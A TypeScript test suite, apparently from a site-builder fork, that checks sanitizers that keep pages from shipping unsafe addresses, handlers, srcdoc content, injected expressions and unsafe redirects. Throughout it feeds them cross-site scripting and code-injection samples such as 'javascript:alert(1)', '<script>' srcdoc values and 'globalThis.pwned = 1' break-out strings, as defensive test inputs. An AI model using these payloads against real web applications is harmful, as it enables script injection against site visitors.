          ),
          // the template's top instances, as a page holds them
          pageRootIds: new Set(
            fragment.children.flatMap((child) =>
              child.type === "id" ? [child.value] : []
            )
          ),
          dataSources: new Map(
            fragment.dataSources.map((dataSource) => [
              dataSource.id,
              dataSource,
            ])
          ),
          props: new Map(fragment.props.map((prop) => [prop.id, prop])),
          resources: new Map(
            fragment.resources.map((resource) => [resource.id, resource])
          ),
          pages: [],
        });
        return fragment.props.flatMap((prop) =>
          prop.type === "action"
            ? [{ name, prop, context: fragmentContext }]
            : []
        );
      }
    );
    // Signup Form, RSVP Form and Rotating Tabs write one each
    expect(actions.length).toBeGreaterThanOrEqual(3);
    for (const { name, prop, context } of actions) {
      expect(actionMayRun(prop, context), name).toBe(true);
    }
  });
});

describe("readsAsOneExpression", () => {
  test("is true for one expression that reads the same way as a statement", () => {
    for (const code of ["x = 1", " x = { a: 1 } ", 'x = "{}"']) {
      expect(readsAsOneExpression(code), code).toBe(true);
    }
  });

  test("is false where a statement reads the code otherwise, or more follows", () => {
    for (const code of [
      "{}",
      "{ a: 1 }",
      "function f() {}",
      "class A {}",
      "x = 1 /* x */",
      "x = 1; y = 2",
      "x = (",
    ]) {
      expect(readsAsOneExpression(code), code).toBe(false);
    }
  });
});

describe("holdsComment", () => {
  test("is true for a comment of either kind anywhere, and for what it cannot read", () => {
    for (const code of [
      "a /* x */",
      "/* x */ a",
      "a = /**/ b",
      "a // x",
      "a = // x\n b",
      "a <!-- x",
      "a\n--> x",
      '"',
    ]) {
      expect(holdsComment(code), JSON.stringify(code)).toBe(true);
    }
  });

  test("is false for the same characters in a string or a template's text, and for division", () => {
    for (const code of ['"/* x */"', "'// x'", "`/* ${a} */`", "a / b / c"]) {
      expect(holdsComment(code), code).toBe(false);
    }
  });
});

describe("holdsAngleBrackets", () => {
  test("is true for a < or << followed anywhere by a token that starts with >", () => {
    for (const code of [
      "a < b > c",
      "a<b>c",
      "a < b > (c)",
      "a < b > `c`",
      "a < b > /c/g",
      "1 < 2 > /(x)/g",
      "a < b >> /c/",
      "a < b > [c]",
      "a < b >\nc",
      "a << b > c",
      "a < b >= c",
      "a < b >> c",
      "a < b >>> c",
      "a < b, a >>= c",
      "a < b, a >>>= c",
      "a < (b ? c : d) > e",
      "[a < b, c > d]",
      "`${a < b}` + (c > d)",
    ]) {
      expect(holdsAngleBrackets(code), JSON.stringify(code)).toBe(true);
    }
  });

  test("is false for a < or a > alone, a > before any <, and either inside a string or a template's text", () => {
    for (const code of [
      "a < b",
      "a > /c/",
      "a > b < c",
      "a >>= b < c",
      "a <= b && b >= c",
      "a <<= b",
      '"<" + ">"',
      "`<${a}>`",
      "'a < b > (c)'",
    ]) {
      expect(holdsAngleBrackets(code), code).toBe(false);
    }
  });

  test("is true for what it cannot read", () => {
    expect(holdsAngleBrackets('"')).toBe(true);
  });
});

describe("unlistedDataSourceIds", () => {
  const node = (
    component: string,
    ...children: string[]
  ): Pick<Instance, "component" | "children"> => ({
    component,
    children: children.map((value) => ({ type: "id", value })),
  });
  const instances = new Map([
    ["body", node("Body", "block", "box")],
    ["block", node(blockComponent)],
    ["box", node("Box")],
  ]);
  const document = (scopeInstanceId: string): [string, DataSource] => [
    "doc",
    { type: "parameter", id: "doc", name: "document", scopeInstanceId },
  ];
  const parameterProp = (instanceId: string, name: string): [string, Prop] => [
    `${instanceId}:${name}`,
    {
      id: `${instanceId}:${name}`,
      instanceId,
      name,
      type: "parameter",
      value: "doc",
    },
  ];
  const unlisted = (
    dataSource: [string, DataSource],
    props: Array<[string, Prop]>
  ) => [
    ...unlistedDataSourceIds({
      instances,
      dataSources: new Map([dataSource]),
      props: new Map(props),
    }),
  ];

  test("is a Content Block's own document, which the block's own document prop names", () => {
    expect(
      unlisted(document("block"), [parameterProp("block", "document")])
    ).toEqual(["doc"]);
  });

  test("is not one that another prop names too, one held elsewhere, or one the block names otherwise", () => {
    expect(
      unlisted(document("block"), [
        parameterProp("block", "document"),
        parameterProp("box", "title"),
      ])
    ).toEqual([]);
    expect(
      unlisted(document("block"), [parameterProp("box", "document")])
    ).toEqual([]);
    expect(
      unlisted(document("block"), [parameterProp("block", "title")])
    ).toEqual([]);
    expect(unlisted(document("block"), [])).toEqual([]);
    expect(
      unlisted(document("box"), [parameterProp("box", "document")])
    ).toEqual([]);
  });
});

describe("componentMayShip", () => {
  const components = new Set(["Box", "@organizeos/site-components:SignupForm"]);

  test("is true for a component the published page imports, and for one the generator writes itself", () => {
    for (const component of [
      "Box",
      "@organizeos/site-components:SignupForm",
      elementComponent,
      collectionComponent,
      blockComponent,
      blockBodyComponent,
      blockTemplateComponent,
      descendantComponent,
    ]) {
      expect(componentMayShip(component, components), component).toBe(true);
    }
  });

  // Every core component but the global root is one the generator writes
  // itself: one an upstream merge adds gets a decision here
  test("names every core component but the global root as one the generator writes", () => {
    expect([...generatedComponents].sort()).toEqual(
      Object.keys(coreMetas)
        .filter((component) => component !== rootComponent)
        .sort()
    );
  });

  test("is false for any other, the builder's global root included", () => {
    for (const component of [
      "x:script",
      "script",
      "Script",
      "box",
      "ws:root",
      "@organizeos/site-components:Missing",
      "",
      1,
      undefined,
    ]) {
      expect(componentMayShip(component, components), String(component)).toBe(
        false
      );
    }
  });
});

describe("instanceIdMayRun", () => {
  test("is false for the global root's id, unless the switch is on", () => {
    expect(instanceIdMayRun(ROOT_INSTANCE_ID)).toBe(false);
    expect(instanceIdMayRun(ROOT_INSTANCE_ID, true)).toBe(true);
    for (const id of ["root", "body", "x:root", ":root "]) {
      expect(instanceIdMayRun(id), id).toBe(true);
    }
  });
});

describe("pageRootIdsOf and templateRootIdsOf", () => {
  test("read the pages' roots and the page templates' roots apart", () => {
    const page = (id: string, rootInstanceId: string) =>
      ({ id, rootInstanceId }) as Page;
    const pages = {
      pages: new Map([
        ["home", page("home", "home-root")],
        ["about", page("about", "about-root")],
      ]),
      pageTemplates: new Map([["template", page("template", "template-root")]]),
    } as unknown as Pages;
    expect([...pageRootIdsOf(pages)]).toEqual(["home-root", "about-root"]);
    expect([...templateRootIdsOf(pages)]).toEqual(["template-root"]);
    expect([...pageRootIdsOf(undefined)]).toEqual([]);
    expect([...templateRootIdsOf(undefined)]).toEqual([]);
  });
});

describe("pagesAndTemplatesOf", () => {
  test("reads each page's and page template's root and own data source, the same list for the same pages", () => {
    const pages = {
      pages: new Map([
        [
          "home",
          { id: "home", rootInstanceId: "home-root", systemDataSourceId: "s1" },
        ],
        ["about", { id: "about", rootInstanceId: "about-root" }],
      ]),
      pageTemplates: new Map([
        [
          "template",
          {
            id: "template",
            rootInstanceId: "template-root",
            systemDataSourceId: "s2",
          },
        ],
      ]),
    } as unknown as Pages;
    expect(pagesAndTemplatesOf(pages)).toEqual([
      { rootInstanceId: "home-root", systemDataSourceId: "s1" },
      { rootInstanceId: "about-root", systemDataSourceId: undefined },
      { rootInstanceId: "template-root", systemDataSourceId: "s2" },
    ]);
    expect(pagesAndTemplatesOf(pages)).toBe(pagesAndTemplatesOf(pages));
    expect(pagesAndTemplatesOf(undefined)).toEqual([]);
  });
});

describe("isPlainData", () => {
  test("is true for null, booleans, numbers, strings, and arrays and plain objects of them", () => {
    for (const value of [
      null,
      true,
      0,
      -1.5,
      NaN,
      Infinity,
      -Infinity,
      [NaN],
      "",
      "state",
      [],
      [1, "a", [null]],
      {},
      { a: 1, b: [{ c: "d" }] },
      Object.create(null),
    ]) {
      expect(isPlainData(value), JSON.stringify(value)).toBe(true);
    }
    // an object shared twice is still plain
    const shared = { a: 1 };
    expect(isPlainData([shared, shared])).toBe(true);
  });

  test("is false for anything else, wherever it is held", () => {
    class Thing {}
    const cyclic: Record<string, unknown> = {};
    cyclic.self = cyclic;
    const getter = Object.defineProperty({}, "x", { get: () => 1 });
    for (const [index, value] of [
      undefined,
      1n,
      Symbol("x"),
      () => 1,
      new Thing(),
      new Date(0),
      new Map(),
      /x/,
      globalThis,
      { a: () => 1 },
      [undefined],
      { a: new Thing() },
      Object.setPrototypeOf([1], {}),
      Object.setPrototypeOf([], Object.create(null)),
      cyclic,
      getter,
      { [Symbol("x")]: 1 },
    ].entries()) {
      expect(isPlainData(value), `value ${index}`).toBe(false);
    }
  });
});

describe("propMayShip", () => {
  const anywhere = [
    { component: "Link" },
    { component: "Box" },
    { component: "Image" },
    { component: elementComponent, tag: "a" },
    { component: elementComponent, tag: "iframe" },
    { component: elementComponent, tag: "img" },
    { component: elementComponent, tag: "object" },
    { component: radixTrigger },
  ];

  test("refuses an unsafe static href, xlink:href, src, action, formaction and data, in any spelling of the name, on any component", () => {
    const names = [
      "href",
      "HREF",
      "xlink:href",
      "xlinkHref",
      "src",
      "Src",
      "action",
      "formaction",
      "formAction",
    ];
    for (const instance of anywhere) {
      for (const name of names) {
        for (const value of ["javascript:alert(1)", "data:text/html,x"]) {
          expect(
            propMayShip(instance, staticProp(name, value)),
            `${instance.component} ${name}`
          ).toBe(false);
        }
        expect(
          propMayShip(instance, staticProp(name, "https://example.org"))
        ).toBe(true);
      }
    }
    // data is an address on an object, and on every holder but a holder of
    // records and a ws:element that is not an object
    for (const instance of [
      { component: elementComponent, tag: "object" },
      { component: "Box" },
      { component: radixTrigger },
    ]) {
      expect(
        propMayShip(instance, staticProp("DATA", "data:text/html,x"))
      ).toBe(false);
    }
  });

  // A variable holds plain data only: nothing writes an element into one
  test("refuses a parameter or an expression named ref, on any component, and ships one of another type", () => {
    for (const instance of anywhere) {
      for (const type of ["parameter", "expression"] as const) {
        const ref = {
          id: "ref",
          instanceId: "i",
          name: "ref",
          type,
          value: "$ws$dataSource$v",
        } as Prop;
        expect(propMayShip(instance, ref), instance.component).toBe(false);
        expect(propMayShip(instance, ref, true)).toBe(true);
        expect(
          propMayShip(instance, { ...ref, name: "data-ref" } as Prop)
        ).toBe(true);
      }
      expect(propMayShip(instance, staticProp("ref", "a"))).toBe(true);
    }
  });

  test("ships page, asset, resource, action, number and boolean props", () => {
    const instance = { component: elementComponent, tag: "a" };
    const typed: Prop[] = [
      { id: "1", instanceId: "i", name: "href", type: "page", value: "page" },
      { id: "2", instanceId: "i", name: "src", type: "asset", value: "asset" },
      {
        id: "3",
        instanceId: "i",
        name: "action",
        type: "resource",
        value: "resource",
      },
      { id: "4", instanceId: "i", name: "action", type: "action", value: [] },
      { id: "5", instanceId: "i", name: "src", type: "number", value: 1 },
      { id: "6", instanceId: "i", name: "href", type: "boolean", value: true },
    ];
    for (const prop of typed) {
      expect(propMayShip(instance, prop), prop.type).toBe(true);
    }
  });

  test("refuses a bound address that decides nothing on Link, a ws:element a, form, button and iframe, and on a Radix trigger", () => {
    const bound: Array<[{ component: string; tag?: string }, string]> = [
      [{ component: "Link" }, "href"],
      [{ component: "RichTextLink" }, "href"],
      [{ component: elementComponent, tag: "a" }, "href"],
      [{ component: elementComponent, tag: "form" }, "action"],
      [{ component: elementComponent, tag: "button" }, "formaction"],
      [{ component: elementComponent, tag: "iframe" }, "src"],
      [{ component: elementComponent, tag: "svg" }, "xlink:href"],
      [{ component: radixTrigger }, "href"],
    ];
    for (const [instance, name] of bound) {
      const label = `${instance.tag ?? instance.component} ${name}`;
      expect(
        propMayShip(instance, staticProp(name, "x.url", "expression")),
        label
      ).toBe(false);
      expect(
        propMayShip(instance, {
          id: name,
          instanceId: "i",
          name,
          type: "parameter",
          value: "parameter",
        }),
        label
      ).toBe(false);
      // a fixed start that decides the scheme ships
      expect(
        propMayShip(
          instance,
          staticProp(name, '"/events/" + x.slug', "expression")
        ),
        label
      ).toBe(true);
    }
  });

  test("ships a bound src on Image and on img, video, audio, source, track and input, and a bound href on Head Link", () => {
    const parameter = (name: string): Prop => ({
      id: name,
      instanceId: "i",
      name,
      type: "parameter",
      value: "parameter",
    });
    const inert = [
      { component: "Image" },
      ...["img", "video", "audio", "source", "track", "input"].map((tag) => ({
        component: elementComponent,
        tag,
      })),
    ];
    for (const instance of inert) {
      expect(
        propMayShip(instance, staticProp("src", "x.url", "expression"))
      ).toBe(true);
      expect(propMayShip(instance, parameter("src"))).toBe(true);
      // a static value is still held to the rule
      expect(
        propMayShip(instance, staticProp("src", "data:image/png;base64,AAAA"))
      ).toBe(false);
    }
    expect(
      propMayShip(
        { component: "HeadLink" },
        staticProp("href", "x.url", "expression")
      )
    ).toBe(true);
    // the exemption is for that name on that holder only
    expect(
      propMayShip({ component: "Image" }, staticProp("href", "x", "expression"))
    ).toBe(false);
    expect(
      propMayShip(
        { component: elementComponent, tag: "embed" },
        staticProp("src", "x", "expression")
      )
    ).toBe(false);
    expect(
      propMayShip({ component: "Video" }, staticProp("src", "x", "expression"))
    ).toBe(false);
  });

  test("ships data of any type and shape on Collection, Signup Form, RSVP Form and a ws:element that is not an object, and judges it on an object, a Box and a Radix trigger", () => {
    const shapes: Prop[] = [
      staticProp("data", "javascript:alert(1)"),
      staticProp("data", "x", "expression"),
      {
        id: "json",
        instanceId: "i",
        name: "data",
        type: "json",
        value: ["javascript:alert(1)"],
      },
      {
        id: "list",
        instanceId: "i",
        name: "data",
        type: "string[]",
        value: ["javascript:alert(1)"],
      },
      {
        id: "parameter",
        instanceId: "i",
        name: "data",
        type: "parameter",
        value: "parameter",
      },
    ];
    for (const instance of [
      { component: "ws:collection" },
      { component: "@organizeos/site-components:SignupForm" },
      { component: "@organizeos/site-components:RsvpForm" },
      { component: elementComponent, tag: "div" },
      { component: elementComponent },
    ]) {
      for (const prop of shapes) {
        expect(propMayShip(instance, prop), instance.component).toBe(true);
      }
    }
    for (const instance of [
      { component: elementComponent, tag: "object" },
      { component: "Box" },
      { component: radixTrigger },
    ]) {
      for (const prop of shapes) {
        expect(
          propMayShip(instance, prop),
          `${instance.component} ${prop.type}`
        ).toBe(false);
      }
      expect(
        propMayShip(instance, {
          id: "json",
          instanceId: "i",
          name: "data",
          type: "json",
          value: { records: [] },
        })
      ).toBe(true);
    }
  });

  test("refuses a string[] and a json href and data on an object that join into a javascript: address", () => {
    const object = { component: elementComponent, tag: "object" };
    for (const name of ["href", "data"]) {
      for (const type of ["json", "string[]"] as const) {
        expect(
          propMayShip(object, {
            id: name,
            instanceId: "i",
            name,
            type,
            value: ["javascript:alert(1)"],
          } as Prop),
          `${type} ${name}`
        ).toBe(false);
        expect(
          propMayShip(object, {
            id: name,
            instanceId: "i",
            name,
            type,
            value: ["https://example.org"],
          } as Prop)
        ).toBe(true);
      }
    }
  });

  test("judges an animation's action by its value, so an Animate Children keeps it", () => {
    // upstream's animationAction holds an animation's settings: an object,
    // which React would write as [object Object]
    expect(
      propMayShip(
        { component: "@organizeos/site-components:AnimateChildren" },
        {
          id: "action",
          instanceId: "i",
          name: "action",
          type: "animationAction",
          value: { type: "view", animations: [] },
        }
      )
    ).toBe(true);
  });

  test("refuses every srcdoc, and every on… prop that is not an action", () => {
    for (const instance of anywhere) {
      for (const name of ["srcdoc", "srcDoc", "SRCDOC"]) {
        expect(propMayShip(instance, staticProp(name, "<p>hi</p>"))).toBe(
          false
        );
        expect(propMayShip(instance, staticProp(name, "x", "expression"))).toBe(
          false
        );
      }
      for (const name of ["onclick", "onMouseOver", "ONERROR", "on-x"]) {
        expect(propMayShip(instance, staticProp(name, "alert(1)"))).toBe(false);
        expect(propMayShip(instance, staticProp(name, "x", "expression"))).toBe(
          false
        );
        expect(
          propMayShip(instance, {
            id: name,
            instanceId: "i",
            name,
            type: "action",
            value: [],
          })
        ).toBe(true);
      }
    }
    // "on" alone names no handler; any longer name that starts with it is
    // held to the rule, as a custom element would read it
    expect(propMayShip({ component: "Box" }, staticProp("on", "x"))).toBe(true);
    expect(propMayShip({ component: "Box" }, staticProp("one", "x"))).toBe(
      false
    );
    expect(propMayShip({ component: "Box" }, staticProp("id", "x"))).toBe(true);
  });

  // The generator writes an action as code on any prop, of any component, on
  // any page: the server renders it too, an XML page included
  test("refuses an action that may not run, whatever its name and on any component, XML Node and XML Time included, and ships one that may", () => {
    const crafted = actionProp([
      { args: [") => 0, globalThis.pwned = 1, (x"], code: "0" },
    ]).value;
    // a variable set with no args, which any prop may do
    const accepted = actionProp([
      { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
    ]).value;
    const context: ActionContext = {
      instances: new Map(),
      pageRootIds: new Set(),
      dataSources: new Map([
        [
          "v",
          { type: "variable", scopeInstanceId: ROOT_INSTANCE_ID, name: "v" },
        ],
      ]),
    };
    for (const instance of [
      ...anywhere,
      { component: collectionComponent },
      { component: "XmlNode" },
      { component: "XmlTime" },
    ]) {
      for (const name of [
        "onClick",
        "onStateChange",
        "href",
        "action",
        "src",
        "data",
        "value",
      ]) {
        const prop = (value: ActionProp["value"]): ActionProp => ({
          id: name,
          instanceId: "i",
          name,
          type: "action",
          value,
        });
        expect(
          propMayShip(instance, prop(crafted)),
          `${instance.component} ${name}`
        ).toBe(false);
        expect(
          propMayShip(instance, prop(accepted), false, context),
          `${instance.component} ${name}`
        ).toBe(true);
        expect(propMayShip(instance, prop(crafted), true)).toBe(true);
      }
    }
  });

  test("refuses an action that reads a member while paused, and ships it when org script may run", () => {
    const prop: ActionProp = {
      ...actionProp(
        [
          {
            args: ["state"],
            code: `${encodeDataSourceVariable("v")} = state.length`,
          },
        ],
        "onStateChange"
      ),
      instanceId: "form",
    };
    const context: ActionContext = {
      instances: new Map([
        [
          "form",
          {
            component: "@organizeos/site-components:SignupForm",
            children: [],
          },
        ],
      ]),
      pageRootIds: new Set(["form"]),
      dataSources: new Map([
        ["v", { type: "variable", scopeInstanceId: "form", name: "v" }],
      ]),
    };
    expect(propMayShip({ component: "Box" }, prop, false, context)).toBe(false);
    expect(propMayShip({ component: "Box" }, prop, true, context)).toBe(true);
  });

  test("ships a Collection's item and key only as a parameter", () => {
    const list = { component: collectionComponent };
    const value = (type: Prop["type"], v: unknown, name = "item") =>
      ({ id: "p", instanceId: "list", name, type, value: v }) as Prop;
    for (const name of ["item", "itemKey"]) {
      expect(
        propMayShip(list, value("parameter", "item", name), false),
        name
      ).toBe(true);
      for (const prop of [
        value("expression", "$ws$dataSource$item", name),
        value("string", "x", name),
        value("json", [], name),
        value("number", 1, name),
      ]) {
        expect(propMayShip(list, prop, false), `${name} ${prop.type}`).toBe(
          false
        );
      }
    }
    // on any other component, and when the switch is on
    expect(propMayShip({ component: "Box" }, value("string", "x"), false)).toBe(
      true
    );
    expect(propMayShip(list, value("string", "x"), true)).toBe(true);
  });

  test("refuses an action that names a data source when it is given none", () => {
    const prop = actionProp([
      { args: [], code: `${encodeDataSourceVariable("v")} = 1` },
    ]);
    expect(propMayShip({ component: "Box" }, prop, false)).toBe(false);
  });

  test("ships every other prop of XML Node and XML Time", () => {
    for (const component of ["XmlNode", "XmlTime"]) {
      for (const prop of [
        staticProp("href", "javascript:alert(1)"),
        staticProp("onmouseover", "alert(1)"),
        staticProp("srcdoc", "<script>alert(1)</script>"),
        staticProp("href", "x.url", "expression"),
      ]) {
        expect(propMayShip({ component }, prop), prop.name).toBe(true);
      }
    }
  });

  test("ships everything when the switch is on", () => {
    expect(
      propMayShip(
        { component: "Link" },
        staticProp("href", "javascript:alert(1)"),
        true
      )
    ).toBe(true);
    expect(
      propMayShip({ component: "Box" }, staticProp("srcdoc", "<p>"), true)
    ).toBe(true);
    expect(
      propMayShip({ component: "Box" }, staticProp("onclick", "x"), true)
    ).toBe(true);
  });
});

describe("pageRedirectMayShip and projectRedirectMayShip", () => {
  test("refuse a javascript: or data: target, static or bound, and allow a page path or an https target", () => {
    const page = (redirect?: string) => ({ meta: { redirect } });
    expect(pageRedirectMayShip(page())).toBe(true);
    expect(pageRedirectMayShip(page('""'))).toBe(true);
    expect(pageRedirectMayShip(page('"/about"'))).toBe(true);
    expect(pageRedirectMayShip(page('"https://example.org"'))).toBe(true);
    expect(pageRedirectMayShip(page('"/events/" + x.slug'))).toBe(true);
    expect(pageRedirectMayShip(page('"javascript:alert(1)"'))).toBe(false);
    expect(pageRedirectMayShip(page('"data:text/html,x"'))).toBe(false);
    expect(pageRedirectMayShip(page("x.url"))).toBe(false);
    expect(pageRedirectMayShip(page('"javascript:" + x'))).toBe(false);
    expect(pageRedirectMayShip(page('"javascript:alert(1)"'), true)).toBe(true);

    const redirect = (target: string) => ({ old: "/go", new: target });
    expect(projectRedirectMayShip(redirect("/about"))).toBe(true);
    expect(projectRedirectMayShip(redirect("https://example.org"))).toBe(true);
    expect(projectRedirectMayShip(redirect("javascript:alert(1)"))).toBe(false);
    expect(projectRedirectMayShip(redirect(" JAVASCRIPT:alert(1)"))).toBe(
      false
    );
    expect(projectRedirectMayShip(redirect("data:text/html,x"))).toBe(false);
    expect(projectRedirectMayShip(redirect("javascript:x"), true)).toBe(true);
  });
});

describe("withoutPausedProps", () => {
  const link = { component: "Link" };

  test("drops what withoutBlockedTagProps drops", () => {
    expect(
      withoutPausedProps(
        { component: "Box" },
        { "data-ws-tag": "script", tag: "SCRIPT", id: "a" }
      )
    ).toEqual({ id: "a" });
    const props = { "data-ws-tag": "script", tag: "urlset" };
    expect(withoutPausedProps({ component: "XmlNode" }, props)).toBe(props);
  });

  test("drops a ref of any value", () => {
    expect(
      withoutPausedProps({ component: "Box" }, { id: "a", ref: { x: 1 } })
    ).toEqual({ id: "a" });
    const props = { id: "a", ref: { x: 1 } };
    expect(withoutPausedProps({ component: "Box" }, props, true)).toBe(props);
  });

  test("drops an evaluated unsafe address, a srcdoc and an on… value that is not a function", () => {
    expect(
      withoutPausedProps(
        { component: elementComponent, tag: "iframe" },
        {
          id: "a",
          src: " JaVaScRiPt:window.pwned = 1",
          srcDoc: "<script>window.pwned = 1</script>",
          srcdoc: 1,
          onclick: "window.pwned = 1",
          onMouseOver: true,
          formAction: "data:text/html,x",
          xlinkHref: "javascript:1",
          ACTION: "vbscript:1",
        }
      )
    ).toEqual({ id: "a" });
  });

  test("keeps functions and safe addresses, and data of any value on a Collection, a Signup Form and a ws:element div", () => {
    const onClick = () => {};
    const props = {
      href: "https://example.org",
      src: "/a.png",
      action: "mailto:a@example.org",
      formAction: "#b",
      onClick,
      onValueChange: onClick,
      title: "javascript:alert(1)",
      onclick: undefined,
    };
    expect(withoutPausedProps(link, props)).toBe(props);
    for (const instance of [
      { component: "ws:collection" },
      { component: "@organizeos/site-components:SignupForm" },
      { component: elementComponent, tag: "div" },
    ]) {
      const records = { data: ["javascript:alert(1)"] };
      expect(withoutPausedProps(instance, records)).toBe(records);
    }
  });

  test("refuses a string[] and a json href and data on an object that join into a javascript: address", () => {
    const object = { component: elementComponent, tag: "object" };
    expect(
      withoutPausedProps(object, {
        data: ["javascript:window.pwned = 1"],
        href: [["javascript:window.pwned = 1"]],
        id: "o",
      })
    ).toEqual({ id: "o" });
    // data is judged by its holder, never by the value's shape
    expect(
      withoutPausedProps(
        { component: "Box" },
        { data: ["data:text/html,x"], id: "b" }
      )
    ).toEqual({ id: "b" });
    expect(withoutPausedProps(object, { data: { a: 1 } })).toEqual({
      data: { a: 1 },
    });
  });

  test("returns the same object when nothing goes, and never changes its input", () => {
    const kept = { href: "/a", id: "a" };
    expect(withoutPausedProps(link, kept)).toBe(kept);
    const props = {
      href: "javascript:alert(1)",
      "data-ws-tag": "script",
      id: "a",
    };
    const copy = { ...props };
    const result = withoutPausedProps({ component: "Box" }, props);
    expect(result).toEqual({ id: "a" });
    expect(props).toEqual(copy);
  });

  test("returns its input when the switch is on", () => {
    const props = {
      href: "javascript:alert(1)",
      srcDoc: "<script></script>",
      onclick: "x",
      "data-ws-tag": "script",
    };
    expect(withoutPausedProps({ component: "Box" }, props, true)).toBe(props);
  });
});

describe("sitemapExcludesPage", () => {
  test("excludes a page only for the literal true", () => {
    expect(sitemapExcludesPage("true")).toBe(true);
    expect(sitemapExcludesPage(" true ")).toBe(true);
    expect(sitemapExcludesPage("(true)")).toBe(true);
    expect(sitemapExcludesPage("true // note")).toBe(true);
    expect(sitemapExcludesPage("true /* note */")).toBe(true);
    expect(sitemapExcludesPage("(true) // note")).toBe(true);
    expect(sitemapExcludesPage("true\n//")).toBe(true);
  });

  test("keeps every other value listed", () => {
    for (const value of [
      undefined,
      "",
      "false",
      '"true"',
      "1",
      "$ws$dataSource$id",
      "true && true",
      "true /*",
      "true; false",
      "!false",
      "(",
    ]) {
      expect(sitemapExcludesPage(value)).toBe(false);
    }
  });

  test("evaluates nothing", () => {
    const marker = "__organizeosSitemapMarker";
    const globals = globalThis as Record<string, unknown>;
    try {
      expect(sitemapExcludesPage(`(globalThis.${marker} = true)`)).toBe(false);
      expect(globals[marker]).toBeUndefined();
    } finally {
      delete globals[marker];
    }
  });
});

describe("pagesForSitemap", () => {
  const page = (id: string, excludePageFromSearch?: string): Page => ({
    id,
    name: id,
    title: `"${id}"`,
    path: `/${id}`,
    rootInstanceId: `${id}-root`,
    meta: { excludePageFromSearch },
  });
  const pages: Pages = {
    meta: { siteName: "Site" },
    homePageId: "home",
    rootFolderId: "root",
    pages: new Map([
      ["home", page("home")],
      ["hidden", page("hidden", "true")],
      ["bound", page("bound", "$ws$dataSource$id")],
      ["code", page("code", "(globalThis.x = true)")],
    ]),
    folders: new Map(),
  } as unknown as Pages;

  test("keeps the literal true and drops every other value", () => {
    const result = pagesForSitemap(pages);
    expect(
      Array.from(result.pages.values(), (item) => [
        item.id,
        item.meta.excludePageFromSearch,
      ])
    ).toEqual([
      ["home", undefined],
      ["hidden", "true"],
      ["bound", undefined],
      ["code", undefined],
    ]);
  });

  test("changes neither the pages passed in nor anything but the setting", () => {
    const before = structuredClone(pages);
    const result = pagesForSitemap(pages);
    expect(pages).toEqual(before);
    const withoutSetting = (value: Pages) => ({
      ...value,
      pages: Array.from(value.pages, ([id, item]) => [
        id,
        { ...item, meta: { ...item.meta, excludePageFromSearch: undefined } },
      ]),
    });
    expect(withoutSetting(result)).toEqual(withoutSetting(pages));
  });
});

describe("readLiteralValue", () => {
  test("reads JSON and the literal forms the variable dialog writes", () => {
    expect(readLiteralValue(`{"a": [1, "b", true, null]}`)).toEqual({
      value: { a: [1, "b", true, null] },
    });
    expect(readLiteralValue(`{ a: 1, "b c": -2.5, 3: \`x\` }`)).toEqual({
      value: { a: 1, "b c": -2.5, "3": "x" },
    });
    expect(readLiteralValue(` ["x", "y"] `)).toEqual({ value: ["x", "y"] });
    expect(readLiteralValue(`undefined`)).toEqual({ value: undefined });
    expect(readLiteralValue(`"text"`)).toEqual({ value: "text" });
    // as the builder formats an object, in parentheses
    expect(readLiteralValue(`({\n  "a": 1\n})`)).toEqual({ value: { a: 1 } });
  });

  test("keeps a __proto__ key as an own property", () => {
    const read = readLiteralValue(`{"__proto__": {"x": 1}}`);
    const value = read?.value as Record<string, unknown>;
    expect(Object.getPrototypeOf(value)).toBe(Object.prototype);
    expect(Object.hasOwn(value, "__proto__")).toBe(true);
  });

  test.each([
    `a`,
    `f()`,
    `[1].map(String)`,
    `{ a: b }`,
    `{ a }`,
    `{ [k]: 1 }`,
    `{ get a() { return 1 } }`,
    `{ a() {} }`,
    `[...a]`,
    `[1, , 2]`,
    `/x/`,
    `1n`,
    `\`\${a}\``,
    `-a`,
    `!1`,
    `1 + 1`,
    `1) || (2`,
    `1), (globalThis.x = 1`,
    `1); (2`,
    `1 /* x */) || (2`,
    `1; 2`,
    `1 // x`,
    `() => 1`,
    ``,
  ])("refuses %s", (text) => {
    expect(readLiteralValue(text)).toBeUndefined();
  });
});

// While org script is paused, the canvas evaluates an expression, and
// publishing writes one into the page's modules, only when expressionMayRun
// passes it (docs/ORGANIZEOS-FORK.md section 10, "Expressions").
describe("expressionMayRun", () => {
  const variable = encodeDataSourceVariable("var-1");
  const item = encodeDataSourceVariable("item-1");

  const lint = (expression: string) =>
    lintExpression({
      expression,
      availableVariables: new Set([
        variable,
        item,
        "$ws$system",
        "undefined",
        "NaN",
        "Infinity",
      ]),
    });

  const refuses = (
    expressions: string[],
    mayName?: (id: string) => boolean
  ) => {
    for (const expression of expressions) {
      expect(expressionMayRun(expression, mayName), expression).toBe(false);
    }
  };

  test("refuses, without throwing, a value that is not a non-empty string", () => {
    for (const value of ["", "  \n", 1, null, undefined, {}, [variable]]) {
      expect(expressionMayRun(value), JSON.stringify(value)).toBe(false);
    }
  });

  test("refuses anything but exactly one expression, with only whitespace around it", () => {
    refuses([
      "0) || (1",
      '"x"} data-x={1',
      `${variable} /* x */`,
      `${variable} // x\n`,
      `/* x */ ${variable}`,
      `${variable}; 1`,
    ]);
    expect(lint(`${variable} /* x */`)).toEqual([]);
    expect(lint("0) || (1")).toEqual([]);
  });

  // An expression holds no comment, inside it or around it
  test("refuses a comment anywhere in an expression", () => {
    const expressions = [
      `${variable} /* x */ .length`,
      `${variable} // x\n.length`,
      `[1, /* x */ 2]`,
      `${variable}.slice(0 /* x */, 1)`,
    ];
    refuses(expressions);
    for (const expression of expressions) {
      expect(lint(expression), expression).toEqual([]);
    }
    // a comment's characters inside a string or a template are text
    for (const expression of ['"/* x */"', "`// x`", `"a" + ${variable}`]) {
      expect(expressionMayRun(expression), expression).toBe(true);
    }
  });

  test("refuses an expression that a script and a module read differently", () => {
    refuses(["0 <!--x\n+ 1", "0\n--> x\n+ 1"]);
  });

  test("refuses what the linter reports, a warning included", () => {
    for (const expression of [
      "this",
      `new ${variable}()`,
      "(0, 1)",
      "globalThis",
      "Body$32$Variable",
      `"x".join(",")`,
      `${variable}++`,
      `${variable} = 1`,
      `(() => 1)`,
      `${variable}\`x\``,
    ]) {
      expect(lint(expression).length, expression).toBeGreaterThan(0);
      expect(expressionMayRun(expression), expression).toBe(false);
    }
  });

  test("refuses delete, a spread, and a regular expression or bigint literal", () => {
    refuses([
      `delete ${variable}.a`,
      `[...${variable}]`,
      `({...${variable}})`,
      "/x/",
      "1n",
    ]);
